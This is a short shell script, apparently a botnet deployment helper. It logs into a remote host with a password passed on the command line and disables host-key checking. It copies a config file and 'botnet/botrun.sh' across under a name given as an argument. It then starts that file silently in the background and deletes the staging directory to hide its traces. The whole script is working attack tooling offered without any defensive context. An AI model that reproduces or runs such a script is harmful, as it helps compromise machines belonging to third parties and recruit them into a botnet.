sshpass -p "$2" scp -oStrictHostKeyChecking=no .config $1@$3:~/predownload/.config
sshpass -p "$2" scp -oStrictHostKeyChecking=no botnet/botrun.sh $1@$3:~/predownload/$4
sshpass -p "$2" ssh -oStrictHostKeyChecking=no $1@$3 /bin/bash << EOF
nohup sh ~/predownload/$4 > /dev/null 2>&1 &
echo "done"
sleep 2
rm -rf ~/predownload
EOF
